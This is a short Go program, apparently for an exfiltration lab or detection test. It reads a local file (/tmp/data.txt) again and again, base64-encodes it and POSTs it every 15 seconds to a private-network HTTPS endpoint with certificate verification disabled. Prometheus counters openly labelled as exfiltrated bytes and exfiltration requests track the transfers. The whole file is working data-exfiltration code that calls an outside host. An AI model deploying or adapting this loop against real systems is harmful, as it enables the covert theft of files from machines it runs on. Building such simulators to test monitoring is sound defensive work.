package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"net/http"
	"os"
	"time"

	"github.com/prometheus/client_golang/prometheus"
	"github.com/prometheus/client_golang/prometheus/promhttp"
)

var (
	dataSent = prometheus.NewCounter(
		prometheus.CounterOpts{
			Name: "data_exfiltrated_bytes_total",
			Help: "Total bytes of data exfiltrated",
		},
	)
	requestsSent = prometheus.NewCounter(
		prometheus.CounterOpts{
			Name: "exfiltration_requests_total",
			Help: "Total number of exfiltration requests sent",
		},
	)
)

func init() {
	prometheus.MustRegister(dataSent)
	prometheus.MustRegister(requestsSent)
}

func main() {
	go func() {
		http.Handle("/metrics", promhttp.Handler())
		fmt.Println("Metrics server running on :2112/metrics")
		http.ListenAndServe(":2112", nil)
	}()

	filePath := "/tmp/data.txt"
	targetURL := "https://192.168.202.129:8443" // HTTPS URL

	// Skip TLS verification for self-signed cert
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	for {
		data, err := os.ReadFile(filePath)
		if err != nil {
			fmt.Println("Error reading file:", err)
			time.Sleep(5 * time.Second)
			continue
		}

		encoded := base64.StdEncoding.EncodeToString(data)

		resp, err := client.Post(targetURL, "text/plain", bytes.NewBuffer([]byte(encoded)))
		if err != nil {
			fmt.Println("Error sending data:", err)
		} else {
			resp.Body.Close()
			if resp.StatusCode == 200 {
				dataSent.Add(float64(len(data)))
				requestsSent.Inc()
				fmt.Println("Data sent. Total bytes:", len(data))
			} else {
				fmt.Println("Unexpected response status:", resp.StatusCode)
			}
		}
		time.Sleep(15 * time.Second)
	}
}
